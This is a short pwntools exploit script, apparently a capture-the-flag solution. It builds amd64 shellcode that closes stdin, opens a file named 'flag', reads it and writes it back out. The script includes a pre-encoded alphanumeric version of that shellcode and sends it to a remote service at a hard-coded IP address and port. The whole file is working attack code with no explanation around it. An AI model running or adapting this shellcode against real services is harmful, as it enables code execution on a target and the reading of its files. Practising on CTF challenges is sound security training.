from pwn import *
#from ae64 import AE64
context(arch='amd64', os='linux', log_level='debug')

code="""push 0
    pop rdi
    push __NR_close
    pop rax
    syscall
    lea rdi, [rcx+0x120-0xad]
    xor rdx, rdx
    push rdx;pop rsi
    push 2
    pop rax
    syscall
    push rax;pop rdi
    inc rdx
    xor rbx,rbx
read_loop:
    lea rsi, [rsp+rbx]
    inc rbx
    xor rax,rax
    syscall
    cmp rax, 0
    jne read_loop
    
    push 1
    pop rdi
    xor r12,r12
write_loop:
    lea rsi, [rsp+r12]
    inc r12
    xor rax,rax
    inc rax
    syscall
    cmp r12, rbx
    jne write_loop

    push __NR_exit_group
    pop rax
    syscall
"""
#obj=AE64()
#code=(obj.encode(asm(code),strategy="small",offset=0x34,register="rax"))
code=b"WTYH39YjoTYfi9pYWZjETYfi95J0t800T8U0T8Vj3TYfi9CA0t800T8KHc1jwTYfi1CgLJt0OjeTYfi1ujVYIJ4NVTXAkv21B2t11A0v1IoVL90uzejnz1ApEsPhzo1V4JKTsidt1Yzm3OJhV8j5dBXjTqEdkqCiJCk5K6FvpLO5U2BUEgKXldTyVcFSY9YZO5KdWIZZ6wRO1Pa4LqgN98TOQ2tl4Gu46ypI2W0cE2aj"
#s=process("../src/test")
s=remote("8.130.35.16",58002)
pause()
s.send(asm("pop rax")*4+code+b"flag")
#s.send(asm(code)+b"/flag\x00")
s.interactive()
